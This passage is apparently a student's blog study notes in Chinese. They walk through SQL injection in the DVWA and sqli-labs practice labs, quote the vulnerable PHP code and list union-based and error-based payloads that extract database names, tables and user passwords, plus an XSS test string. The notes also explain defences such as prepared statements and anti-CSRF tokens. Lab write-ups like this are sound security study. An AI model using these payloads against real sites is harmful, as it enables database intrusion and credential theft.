/&gt;Surname: {$last}&lt;/pre&gt;&quot;;     }     mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); //关闭数据库连接}?&gt;</code></pre><h4 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h4><p>1.判断是否存在注入</p><p>2.判断字段数 order by</p><p>输入1’order by2#    两个字段</p><p>问题1：为什么不能用–+，在http请求中不是不允许出现#吗，可是这边#怎么能用?</p><p>答：（还搞不清楚）</p><p>3.联合查询注入</p><p>1)输入-1’union select2,3#发现两个位置均能显示</p><p>4.payload</p><p>1)输入 -1’union select user(),database()# 注当前用户名和数据库名</p><p>2)输入</p><p>-1’ union select 1,group_concat(TABLE_NAME,0x3c2f62723e) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#</p><p>遇到提示：Error: Illegal mix of collations for operation ‘UNION’，这种错误的成因是因为编码的缘故，字符集的编码不同所导致的，要解决就配合convart、using latin1函数来解决。</p><p>（<a href="https://blog.csdn.net/qq_35569814/article/details/100274561" target="_blank" rel="noopener">这边参考的题解</a>）</p><p>CONVERT() 函数是把日期转换为新数据类型的通用函数。</p><p>大致poyload如下</p><p>UNION SELECT 1,2,3,4,5,6,7,convert(Table_Name using latin1) from information_schema.tables Where table_Schema=database()–+</p><p>故改成输入</p><p>-1’ union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#得到表名</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200501004352747.png" alt=""></p><p>3)输入</p><p> -1’ union select 1,convert(column_NAME using latin1) from information_schema.columnS where TABLE_name=’users’#</p><p>得到表中字段名</p><p>4）输入</p><p>-1’ union select 1,convert(user using latin1) from users#</p><p>得到字段值</p><p><a href="http://www.langzi.fun/DVWA源码解读之SQL-Injection.html" target="_blank" rel="noopener">参考的题解</a></p><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><h4 id="源码：-1"><a href="#源码：-1" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?php if( isset( $_POST[ &#39;Submit&#39; ] ) ) {     // Get input     $id = $_POST[ &#39;id&#39; ];     $id = mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;], $id); // mysqli_real_escape_string(connection,escapestring) 函数转义在 SQL 语句中使用的字符串//中的特殊字符。//$GLOBALS[ ]是所有已定义全局变量组成的数组。$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;; //由$query此句可知输入的id不用特殊字符    $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query) or die( &#39;&lt;pre&gt;&#39; . mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) . &#39;&lt;/pre&gt;&#39; ); //mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询//connection：MySQL连接，query规定查询字符串，resultmode可省//result存数据//or后面是判断是否连接成功，三元判断，执行了就返回真  // Get results while( $row = mysqli_fetch_assoc( $result ) ) { //mysqli_fetch_assoc(result)函数从结果集中取得一行作为关联数组。//返回的字段名区分大小写，每个字段名做为row的键名，数据是对应的单元值。所以才有$row[&quot;first_name&quot;]这种形式出来        // Display values         $first = $row[&quot;first_name&quot;];         $last  = $row[&quot;last_name&quot;];         // Feedback for end user         echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;     } } // This is used later on in the index.php page // Setting it here so we can close the database connection in here like in the rest of the source scripts $query  = &quot;SELECT COUNT(*) FROM users;&quot;; $result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;],  $query ) or die( &#39;&lt;pre&gt;&#39; . ((is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_error($GLOBALS[&quot;___mysqli_ston&quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . &#39;&lt;/pre&gt;&#39; ); $number_of_rows = mysqli_fetch_row( $result )[0]; //不是很理解为什么还要搞出这么一段，为什么要查询全部字段并存到result？mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]); ?&gt;</code></pre><h4 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h4><p>1.判断注入：数字型注入（因为网站没法输入，故下面的步骤都用burpsuite，其余步骤与low级别差不多，同样得配合convert函数，否则会出错）（用burpsuite的意思是直接在burpsuite的界面操作，send to repeater之后点击action）</p><p>2.判断字段数</p><p>输入1 order by 1# 两个字段</p><p>3.联合查询注入</p><p>输入1 union select 1,2# 发现两个位置都可以显示</p><p>问题2：为什么不用把1改成-1呢？之前看到的说法是前边出错才能执行后面的，可是我觉得没出错也能执行后面的啊？</p><p>答：因为sqli-labs是只能显示一条记录（mysql_fetch_array()仅被调用一次），如果前面是1的话会显示1而不显示后边的操作结果，dvwa不只显示一条记录（mysqli_fetch_assoc()可多次调用），所以-1或者1无所谓。</p><p>4.payload</p><p>1）输入1 union select 1,database()#注数据库名</p><p>2）输入1 union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=database()#注表名</p><p>这边得用database()，因为单引号会被转义。</p><p>3）输入1 union select 1,convert(column_name using latin1) from information_schema.columns where table_name=0x7573657273 # 注表中字段名</p><p><a href="http://www.mamicode.com/info-detail-2778166.html" target="_blank" rel="noopener">用十六进制进行绕过，SQL绕过基础</a></p><p>4）输入1 union select user,password from users#得字段值</p><p><a href="https://www.cnblogs.com/amberhome-wei/p/12048339.html" target="_blank" rel="noopener">参考题解</a></p><h2 id="High级别"><a href="#High级别" class="headerlink" title="High级别"></a>High级别</h2><h4 id="源码：-2"><a href="#源码：-2" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_SESSION [ &#39;id&#39; ] ) ) {//session变量用于存储储关于用户会话（session）的信息，或者更改用户会话（session）的设置。所以才能弹出另一个窗口出来。 // Get input    $id = $_SESSION[ &#39;id&#39; ];    // Check database$query  = &quot;SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39; LIMIT 1;&quot;;$result = mysqli_query($GLOBALS[&quot;___mysqli_ston&quot;], $query ) or die( &#39;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#39; );////mysqli_query(connection，query，resultmode)函数执行某个针对数据库的查询。//$GLOBALS[&quot;___mysqli_ston&quot;]只是一个自定义全局变量？//mysqli_ston是哪里来的呢？上面也完全没提到，所以是连接数据库？    // Get results    while( $row = mysqli_fetch_assoc( $result ) ) {        // Get values        $first = $row[&quot;first_name&quot;];        $last  = $row[&quot;last_name&quot;];        // Feedback for end user        echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;    }((is_null($___mysqli_res = mysqli_close($GLOBALS[&quot;___mysqli_ston&quot;]))) ? false : $___mysqli_res);    //is_null() 检测变量是否为null；// 注意：空字符串：已经分配了存储空间，但是没有存储东西;NULL：没有分配存储空间。  //}?&gt;</code></pre><h4 id="实战-2"><a href="#实战-2" class="headerlink" title="实战"></a>实战</h4><p>1.判断注入：字符型注入</p><p>没有给出确切的错误信息，但试过发现跟low级别的解题过程没什么区别。</p><p>2.判断字段数：输入1’ order by 3# 两个字段</p><p>3.联合查询注入: -1’ union select 1,2 #</p><p>4.payload:</p><p>1）输入-1’ union select 1,database()# 注数据库名</p><p>2）输入-1’ union select 1,convert(TABLE_NAME using latin1) from information_schema.TABLES where TABLE_SCHEMA=’dvwa’#得到表名</p><p>3）输入-1’ union select 1,convert(column_NAME using latin1) from information_schema.columnS where TABLE_name=’users’#</p><p>得到表中字段名</p><p>4）输入</p><p>-1’ union select 1,convert(user using latin1) from users#</p><p>得到字段值</p><h2 id="Impossible级别"><a href="#Impossible级别" class="headerlink" title="Impossible级别"></a>Impossible级别</h2><h4 id="源码：-3"><a href="#源码：-3" class="headerlink" title="源码："></a>源码：</h4><pre><code class="php">&lt;?phpif( isset( $_GET[ &#39;Submit&#39; ] ) ) {    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );//这句是为了防止CSRF攻击，即防止跨站点请求伪造攻击，CSRF相关注释在下边//token解释在下边    // Get input    $id = $_GET[ &#39;id&#39; ];    // Was a number entered?if(is_numeric( $id )) {//is_numeric() 函数用于检测变量是否为数字或数字字符串。        // Check the database        $data = $db-&gt;prepare( &#39;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#39; );//这个是预编译//预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程。预编译语句能防止sql注入。//在impossible.php中还限制了只允许返回一条数据。就是if( $data-&gt;rowCount() == 1 ) 。        $data-&gt;bindParam( &#39;:id&#39;, $id, PDO::PARAM_INT );        $data-&gt;execute();        $row = $data-&gt;fetch();        // Make sure only 1 result is returned        if( $data-&gt;rowCount() == 1 ) {            // Get values            $first = $row[ &#39;first_name&#39; ];            $last  = $row[ &#39;last_name&#39; ];            // Feedback for end user            echo &quot;&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;&quot;;        }    }}// Generate Anti-CSRF tokengenerateSessionToken();//在登录界面/var/www/html/login.php和本页面都能生成Token//具体的函数在dvwaPhpIds.inc.php中，验证在impossible.php（就是本篇代码）中//请注意：要避免&quot;加token但不进行校验&quot;的情况。在session中增加了token，但服务端没//有对token进行验证，那根本起不到防范的作用。提交的浏览器的URL每次的token都是//不一样的。?&gt;</code></pre><p>1.Check Anti-CSRF token：</p><p>（1）CSRF，Cross Site Request Forgery，中文是跨站点请求伪造。CSRF攻击者在用户已经登录目标网站之后，诱使用户访问一个攻击页面，利用目标网站对用户的信任，以用户身份在攻击页面对目标网站发起伪造用户操作的请求，达到攻击目的。</p><p>CSRF攻击是源于Web的隐式身份验证机制！Web的身份验证机制虽然可以保证一个请求是来自于某个用户的浏览器，但却无法保证该请求是用户批准发送的。</p><p>CSRF攻击的一般是由服务端解决。</p><p>应对CSRF的方法有</p><p>1）尽量使用POST，限制GET</p><p>2）浏览器Cookie策略</p><p>3）加验证码</p><p>4）Referer Check ，例如：防止图片盗链</p><p>5）Anti CSRF Token</p><p>上面的代码用的是第5点。</p><p>（2）Token是服务端生成的一串字符串，以作客户端进行请求的一个令牌，当第一次登录后，服务器生成一个Token便将此Token返回给客户端，以后客户端只需带上这个Token前来请求数据即可，无需再次带上用户名和密码。这样可以减轻服务器的压力，减少频繁的查询数据库。</p><p>使用Token有2种方式：</p><p>1）用设备号/设备mac地址作为Token</p><p>2）用session值作为Token用session值作为Token</p><p>Token的好处是服务端不需要存储相应信息。</p><p>大概的流程是这样的：</p><p>1）客户端使用用户名跟密码请求登录</p><p>2）服务端收到请求，去验证用户名与密码</p><p>3）验证成功后，服务端会签发一个 Token，再把这个 Token 发送给客户端</p><p>4）客户端收到 Token 以后可以把它存储起来，比如放在 Cookie 里或者 Local Storage 里</p><p>5）客户端每次向服务端请求资源的时候需要带着服务端签发的 Token</p><p>6）服务端收到请求，然后去验证客户端请求里面带着的 Token，如果验证成功，就向客户端返回请求的数据</p><p>当然，如果Token被不怀好意的人从中间获取到该信息时，也容易被利用，非法获取数据。 想增强安全性，一般可以在服务端生成时配合时间戳，服务端在接收到client发来带token的信息时，先检测token的时间戳信息，如果该时间戳在超过某个时间点时，就认为过期，需要重新获取。</p><p>Token一般用在两个地方:</p><p>1）防止表单重复提交：服务器端第一次验证相同过后，会将session中的Token值更新。若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变了。</p><p>2）anti csrf攻击（跨站点请求伪造）：服务器端会对Token值进行验证，判断是否和session中的Token值相等。若相等，则可以证明请求有效，不是伪造的。</p><p><a href="https://www.pianshen.com/article/2567257653/" target="_blank" rel="noopener">参考博客</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;DVWA-SQL-injection&quot;&gt;&lt;a href=&quot;#DVWA-SQL-injection&quot; class=&quot;headerlink&quot; title=&quot;DVWA SQL injection&quot;&gt;&lt;/a&gt;DVWA SQL injection&lt;/h1&gt;&lt;h2 id=&quot;L
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Sqli-labs（1-5关）</title>
    <link href="http://yoursite.com/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/"/>
    <id>http://yoursite.com/2020/05/14/Sqli-labs%EF%BC%881-5%E5%85%B3%EF%BC%89/</id>
    <published>2020-05-14T12:27:03.753Z</published>
    <updated>2020-05-13T14:14:02.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Sqli-labs（1-5关）"><a href="#Sqli-labs（1-5关）" class="headerlink" title="Sqli-labs（1-5关）"></a>Sqli-labs（1-5关）</h1><p><a href="https://baike.baidu.com/item/SQL%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/4766224?fr=aladdin#2" target="_blank" rel="noopener">基本的百度百科SQL注入攻击概念理解  参考链接</a></p><p>很好的SQL注入步骤讲解<a href="https://www.cnblogs.com/puhk/p/12674740.html" target="_blank" rel="noopener"> 参考链接：https://www.cnblogs.com/puhk/p/12674740.html</a></p><p>SQL注入方式：数字型和字符型。</p><p>参考博客的链接：<a href="https://www.cnblogs.com/xyhacker/p/10022858.html" target="_blank" rel="noopener">https://www.cnblogs.com/xyhacker/p/10022858.html</a></p><p>判断方式：</p><blockquote><p>1、数字型注入</p><p>当输入的参数为整形时，如果存在注入漏洞，可以认为是数字型注入。</p><p>测试步骤：(<strong>记得输入法改为中文！！</strong>)</p><p>（1） 加单引号，URL：<code>www.text.com/text.php?id=3’</code></p><p>对应的sql：select * from table where id=3’ 这时sql语句出错，程序无法正常从数据库中查询出数据，就会抛出异常；</p><p>（2） 加and 1=1 ,URL：<code>www.text.com/text.php?id=3 and 1=1</code></p><p>对应的sql：select * from table where id=3’ and 1=1 语句执行正常，与原始页面如任何差异；</p><p>（3） 加and 1=2，URL：<code>www.text.com/text.php?id=3 and 1=2</code></p><p>对应的sql：select * from table where id=3 and 1=2 语句可以正常执行，但是无法查询出结果，所以返回数据与原始网页存在差异</p><p>如果满足以上三点，则可以判断该URL存在数字型注入。</p><p>2、字符型注入</p><p>当输入的参数为字符串时，称为字符型。字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。</p><p>例如数字型语句：select * from table where id =3</p><p>则字符型如下：select * from table where name=’admin’</p><p>因此，在构造payload时通过闭合单引号可以成功执行语句：</p><p>测试步骤：</p><p>（1） 加单引号：select * from table where name=’admin’’</p><p>由于加单引号后变成三个单引号，则无法执行，程序会报错；</p><p>（2） 加 ’and 1=1 此时sql 语句为：select * from table where name=’admin’ and 1=1’ ,也无法进行注入，还需要通过注释符号将其绕过；</p><p>Mysql 有三种常用注释符：</p><p>– 注意，这种注释符后边有一个空格</p><p># 通过#进行注释</p><p>/* */ 注释掉符号内的内容</p><p>因此，构造语句为：select * from table where name =’admin’ and 1=1—’ 可成功执行返回结果正确；</p><p>（3） 加and 1=2— 此时sql语句为：select * from table where name=’admin’ and 1=2 –’则会报错</p><p>如果满足以上三点，可以判断该url为字符型注入。</p></blockquote><p><strong>常用系统函数</strong></p><ol><li>version()——MySQL 版本</li><li>user()——数据库用户名</li><li>database()——数据库名</li><li>@@datadir——数据库路径</li><li>@@version_compile_os——操作系统版本</li></ol><p><strong>字符串连接函数</strong></p><ol><li>concat(str1,str2,…)——没有分隔符地连接字符串</li><li>concat_ws(separator,str1,str2,…)——含有分隔符地连接字符串</li><li>group_concat(str1,str2,…)——连接一个组的所有字符串，并以逗号分隔每一条数据     说着比较抽象，其实也并不需要详细了解，知道这三个函数能一次性查出所有信息就行了。</li></ol><p>一般用于测试是否存在注入</p><pre><code>?? and 1=2–+‘and 1=2–+“and 1=2–+)and 1=2–+‘)and 1=2–+“)and 1=2–+“))and 1=2–+</code></pre><p>一般的代码为： $id=$_GET[‘id’]; $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; 此处考虑两个点，一个是闭合前面你的 ‘ 另一个是处理后面的 ‘ ，一般采用两种思 路，闭合后面的引号或者注释掉，注释掉采用–+ 或者 #（%23）</p><h2 id="第一关："><a href="#第一关：" class="headerlink" title="第一关："></a>第一关：</h2><h4 id="1-判断是数字型还是字符型"><a href="#1-判断是数字型还是字符型" class="headerlink" title="1.判断是数字型还是字符型"></a>1.判断是数字型还是字符型</h4><p> 得字符型</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513205214145.png" alt="image-20200513205214145"></p><p><strong>问题1：我不是很理解报错这句话limit后面的意思，不明白1后面为啥有个单引号？</strong></p><p>翻译（从right开始）：在第1行“1”限制0,1附近使用的正确语法。</p><p>源码是  $sql=”SELECT * FROM users WHERE id=’$id’ LIMIT 0,1”; （源码在文件夹里边的index.php看）</p><p>输入1’后变成$sql=”SELECT * FROM users WHERE id=’1’’ LIMIT 0,1 ‘’ </p><p>我的想法：分别输入id=’1、1’、’’’1、’1 ,推测出报错格式应该如下，…use near ’id等号后面的内容’ at line 1;所以在不看源码的情况下我们才能推到源码会是id=’网页输入的内容’</p><h4 id="2-猜字段数（用order-by排序-数字一个一个试）"><a href="#2-猜字段数（用order-by排序-数字一个一个试）" class="headerlink" title="2.猜字段数（用order by排序 数字一个一个试）"></a>2.猜字段数（用order by排序 数字一个一个试）</h4><p>即输入?id=1’order by 4–+ </p><p>错误，多次尝试知晓只有三个字段（三个列）</p><p><strong>问题2：为什么用–+呢？</strong></p><p>答：为了注释掉后面的东西。#也可以注释，不用#的原因是url中#号是用来指导浏览器动作的（例如锚点），对服务器端完全无用。所以，HTTP请求中不包括#，将#号改成url的编码%23就可以了。（因为在<a href="http://test.ctf8.com/" target="_blank" rel="noopener">http://test.ctf8.com/</a> 这个XSS靶场 level2中我在url后输入”&gt;<script>alert(1)</script>#或者把#改成–+或– 或–space都可以过关，所以这边对于#用不了的解释存疑）使用–不行，原因–与后面的单引号连在一起没办法形成有效的SQL语句。还查到可以用–‘或–space注释掉,但是实践过发现– ‘（在’前加了个空格）或– space（space前加了个空格）才可行。</p><h4 id="3-联合查询"><a href="#3-联合查询" class="headerlink" title="3.联合查询"></a>3.联合查询</h4><p>即输入?id=-1’union select 3,2,1–+</p><p>发现后面两个位置，即上面2,1两处输入的东西可在网页上显示。</p><p>使用 union 参数进行联合查询注入，union前面的参数报错才能执行union后面的数据（原因在下面），因此将 id = 1 改为 id = -1 （即把id值设为非正数（负数或0），浮点数，字符型或字符串）开始进行注入。</p><p>联合查询注入利用的前提条件：页面上有显示位</p><p><strong>问题3：什么是显示位？</strong></p><p>答：在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，这个展示数据的位置就叫显示位。</p><p><strong>union前面的参数报错才能执行union后面的数据原因：</strong></p><pre><code>源码：$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;$result=mysqli_query($con, $sql);$row = mysqli_fetch_array($result, MYSQLI_BOTH);    if($row)    {      echo &quot;&lt;font size=&#39;5&#39; color= &#39;#99FF00&#39;&gt;&quot;;      echo &#39;Your Login name:&#39;. $row[&#39;username&#39;];      echo &quot;&lt;br&gt;&quot;;      echo &#39;Your Password:&#39; .$row[&#39;password&#39;];      echo &quot;&lt;/font&gt;&quot;;      }</code></pre><p>mysqli_query(connection,query,resultmode); </p><p>connection</p><p>必需。规定要使用的 MySQL 连接。</p><p>query</p><p>必需，规定查询字符串。</p><p>resultmode</p><p>可选。一个常量。可以是下列值中的任意一个：</p><p>MYSQLI_USE_RESULT（如果需要检索大量数据，请使用这个）</p><p>MYSQLI_STORE_RESULT（默认）</p><blockquote><p>mysql_fetch_array(<em>data</em>,<em>array_type</em>) 函数从结果集中取得一行作为关联数组，或数字数组，或二者兼有，返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false。</p><p>UNION的作用是将两个select查询结果合并，程序在展示数据的时候通常只会取结果集的第一行数据，看一下源码，mysql_fetch_array只被调用了一次，而mysql_fetch_array从结果集中取得一行作为关联数组或数字数组或二者兼有，具体看第二个参数是什么。所以这里无论怎么折腾最后只会出来第一行的查询结果。只要让第一行查询的结果是空集，即union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了，然后我们就得到了显示位。</p></blockquote><p>上面这段仍看不懂可细看这个博客,参考链接：<a href="https://blog.csdn.net/weixin_42277564/java/article/details/80583959" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42277564/java/article/details/80583959</a></p><p>Union 后面的select 什么用？select 1,2,3…如果没有指向某个表，那么它意味着输出1,2,3。</p><p><a href="https://blog.csdn.net/weixin_44840696/article/details/89166154" target="_blank" rel="noopener">select参考博客</a></p><p><strong>问题4：那为什么order by 前面的id不用等于-1就可以执行？</strong></p><p>答：因为order by 用不着执行到下面。</p><h4 id="4-payload"><a href="#4-payload" class="headerlink" title="4.payload"></a>4.payload</h4><p>（意为有效载荷，简单说就是对于接收者有用的数据；因为前面我们查到有两个位置可以在页面上显示，所以我们就可以利用这两个位置来得到我们想要的信息）</p><p><a href="https://www.cnblogs.com/jiersixi/p/11784769.html" target="_blank" rel="noopener">payload的一些知识的参考博客</a></p><p>1)输入?id=-1’union select 1,database(),3 –+ 注当前数据库名</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210135523.png" alt="image-20200513210135523"></p><p>2)输入?id=-1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+ 注表名</p><p>（备注：information_schema数据库是mysql自带的，【INFORMATION_SCHEMA 数据库】 是MySQL自带的，它提供了访问数据库 元数据 的方式。什么是 元数据 呢？元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等。</p><p>有些时候用于表述该信息的其他术语包括“数据词典”和“系统目录”。</p><p>在MySQL中，把【INFORMATION_SCHEMA】 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><p>在 【INFORMATION_SCHEMA 】中，有数个 只读 表。它们实际上是 视图 ，而不是基本表，因此，你将无法看到与之相关的任何文件。</p><p><a href="http://www.luyixian.cn/news_show_9165.aspx" target="_blank" rel="noopener">http://www.luyixian.cn/news_show_9165.aspx</a></p><p>（table_schema即数据表所属的数据库名）</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210321131.png" alt="image-20200513210321131"></p><p>3)输入?id=-1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+注某张表的字段，这里以users为例</p><p>（Table_name：表名称）</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210339398.png" alt="image-20200513210339398"></p><p>4）输入?id=-1’ union select 1,group_concat(username),3 from security.users –+注字段的值，这里注 users 表里的 usrname 字段为例</p><p><img src="C:%5CUsers%5CDELL%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200513210359537.png" alt="image-20200513210359537"></p><p>【备注：</p><p>1）函数database（）返回当前数据库名</p><p>2）字段名即table_schema等的参考链接：<a href="https://www.cnblogs.com/shoshana-kong/p/10979295.html" target="_blank" rel="noopener">简单版</a>     <a href="https://wenku.baidu.com/view/6358a5fd89eb172ded63b7a8.html" target="_blank" rel="noopener">详细版</a></p><p>3）group_concat(name,sex)结果：左边显示组名，右边想显示该组别下的所有成员信息。</p><p>因为group_concat函数可以一次性查出所有信息，所以用它。</p><p>group_concat函数的用法的参考链接：<a href="https://www.cnblogs.com/baizhanshi/p/10918711.html" target="_blank" rel="noopener">https://www.cnblogs.com/baizhanshi/p/10918711.html</a>】</p><p>参考链接1 ：<a href="https://www.jianshu.com/p/ac546306f1e8" target="_blank" rel="noopener"> https://www.jianshu.com/p/ac546306f1e8</a></p><p>参考链接2：<a href="http://www.secist.com/archives/4880.html" target="_blank" rel="noopener">  http://www.secist.com/archives/4880.html</a></p><h2 id="第二关："><a href="#第二关：" class="headerlink" title="第二关："></a>第二关：</h2><p>1.判断字符型还是数字型 得数字型</p><p>2.猜字段order by</p><p>3.联合查询union select</p><p>4.payload：去掉’输入得结果，均与第一题一样。</p><h2 id="第三关："><a href="#第三关：" class="headerlink" title="第三关："></a>第三关：</h2><h4 id="1-判断字符型还是数字型"><a href="#1-判断字符型还是数字型" class="headerlink" title="1.判断字符型还是数字型"></a>1.判断字符型还是数字型</h4><p>输入?id=1’报错发现有个)</p><p>跟第一题进行对比后发现，此题id格式应为id=(‘1’)。</p><p><strong>【</strong>做题的时候输入法忘记改了，为中文，然后我发现id等号后面输入中文单引号，括号为中文或英文的时候都没有报错，我就很奇怪，后来想一下可能之所以中文单引号没报错是因为他没把它当单引号】</p><p>第一题为基于错误的GET单引号字符型注入，第三题为基于错误的GET单引号变形字符型注入。</p><h4 id="2-猜字段order-by"><a href="#2-猜字段order-by" class="headerlink" title="2.猜字段order by"></a>2.猜字段order by</h4><p>输入?id=1’) order by 4–+ 得字段为3</p><h4 id="3-联合查询注入"><a href="#3-联合查询注入" class="headerlink" title="3.联合查询注入"></a>3.联合查询注入</h4><p>输入?id=-1’) union select 1,2,3–+</p><h4 id="4-payload-1"><a href="#4-payload-1" class="headerlink" title="4.payload"></a>4.payload</h4><p>输入?id=-1’) union select 1,database(),3–+</p><p>输入?id=-1’) union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=”security”–+</p><p>输入?id=-1’) union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ –+</p><p>输入?id=-1’) union select 1,group_concat(username),3 from security.users–+</p><h2 id="第四关："><a href="#第四关：" class="headerlink" title="第四关："></a>第四关：</h2><p>1.判断整型或字符型 </p><p>得基于错误的GET双引号字符型注入，故除了需要把 ’) 改成 ”) 其他均跟上文一样。</p><p>2.猜字段 order by</p><p>3.联合查询注入</p><p>4.payload</p><h2 id="第五关："><a href="#第五关：" class="headerlink" title="第五关："></a>第五关：</h2><h4 id="1-判断"><a href="#1-判断" class="headerlink" title="1.判断"></a>1.判断</h4><p>输入?id=1没错，输入?id=1’报错</p><p>这道题没有显示位，所以得用双查询报错注入</p><p>双查询注入详解参考的链接：<a href="https://www.2cto.com/article/201303/192718.html" target="_blank" rel="noopener">https://www.2cto.com/article/201303/192718.html</a></p><blockquote><p>归纳：</p><p>1）查询数据库名：</p><p>select count(<em>), concat((select database()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>2）查询版本：</p><p>select count(<em>), concat((select version()), floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>3）查询用户名：</p><p>select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a;</p><p>4）查询派生表：</p><p>select 1 from (select count(<em>), concat(‘<del>‘,(select user()),’</del>‘, floor(rand()</em>2))as a from information_schema.tables group by a)x;</p></blockquote><h4 id="2-payload："><a href="#2-payload：" class="headerlink" title="2.payload："></a>2.payload：</h4><p>1）输入?id=-1’ union select 1,count(<em>),concat(database(),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到数据库名</p><p>2）输入?id=-1’ union select 1,count(<em>),concat((select table_name from information_schema.tables where table_schema=”security” limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到表名</p><p>3）输入?id=-1’ union select 1,count(<em>),concat((select column_name from information_schema.columns where table_name=’users’ limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的字段</p><p>4）输入?id=-1’ union select 1,count(<em>),concat((select username from security.users limit 1,1),floor(rand(0)</em>2))x from information_schema.tables group by x;–+ 得到users表的username字段的值</p><p><strong>问题6</strong>：可是明明就没有爆出users这个表名，只得到referers,怎么才能看到所有的表名呢？</p><p>答：会对此产生疑问是因为没有理解limit（1,1）；LIMIT m,n指从第m+1条开始，取n条。该题只能显示一条，所以n=2的时候会报错。当m=3的时候出来的表名就是users。</p><h2 id="报错的类型："><a href="#报错的类型：" class="headerlink" title="报错的类型："></a>报错的类型：</h2><p>参考博客：<a href="https://blog.csdn.net/weixin_42277564/article/details/80635586" target="_blank" rel="noopener">https://blog.csdn.net/weixin_42277564/article/details/80635586</a></p><blockquote><p>1.通过floor报错<br>     and (select 1 from (select count(<em>),concat((payload),floor (rand(0)</em>2))x     from information_schema.tables group by x)a)<br>     其中payload为你要插入的SQL语句<br>     需要注意的是该语句将     输出字符长度限制为64个字符</p><p>注：输出字符长度限制为64个字符payload填sql语句如查询当前数据库</p><p><a href="http://127.0.0.1/sql/Less-5/?id=1&#39;" target="_blank" rel="noopener">http://127.0.0.1/sql/Less-5/?id=1&#39;</a> and (select 1 from (select </p><p>count(<em>),concat((database()),floor(rand(0)</em>2))x from information_schema.tables group by x)a)%23</p><p>2.通过updatexml报错<br>     and updatexml(1,payload,1)</p><p>and updatexml(1,concat(0x7e,@@version,0x7e),1)</p><p>同样该语句对输出的字符长度也做了限制，其最长输出32位<br> 并且该语句对payload的反悔类型也做了限制，只有在payload返回的不是xml格式才会生效</p><p>3.通过ExtractValue报错</p><p>and extractvalue(1, payload)</p><p>and extractvalue(1, concat(0x7e,@@version,0x7e))<br> 输出字符有长度限制，最长32位。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
